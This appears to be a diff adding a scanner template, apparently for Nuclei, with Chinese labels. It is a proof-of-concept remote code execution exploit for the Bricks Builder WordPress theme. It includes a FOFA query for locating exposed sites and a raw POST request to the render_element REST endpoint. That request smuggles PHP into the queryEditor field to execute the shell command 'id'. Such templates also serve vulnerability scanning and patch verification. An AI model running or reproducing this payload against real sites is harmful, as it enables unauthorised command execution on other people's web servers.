@@ -1,0 +1,19 @@
+id: poc-gv6a89f9eh5l7vr9
+info:
+  name: WordPress插件Bricks Builder存在RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gv6a89f9eh5l7vr9'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gv6a89f9eh5l7vr9
+    fofa: body="/wp-content/themes/bricks/"
+http:
+- raw:
+  - "POST /wp-json/bricks/v1/render_element HTTP/1.1\n\nConnection: close\n\nContent-Type: application/json\n\nAccept-Encoding: gzip\n\n\n\n{\n\n  \"postId\": \"1\",\n\n  \"nonce\": \"b5b275220f\",\n\n  \"element\": {\n\n    \"name\": \"container\",\n\n    \"settings\": {\n\n      \"hasLoop\": \"true\",\n\n      \"query\": {\n\n        \"useQueryEditor\": true,\n\n        \"queryEditor\": \"ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);\",\n\n        \"objectType\": \"post\"\n\n      }\n\n    }\n\n  }\n\n}\n\n# 响应代码特征\n200\n\n# 响应内容特征\n^(?=.*?uid)(?=.*?Exception).*?$\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
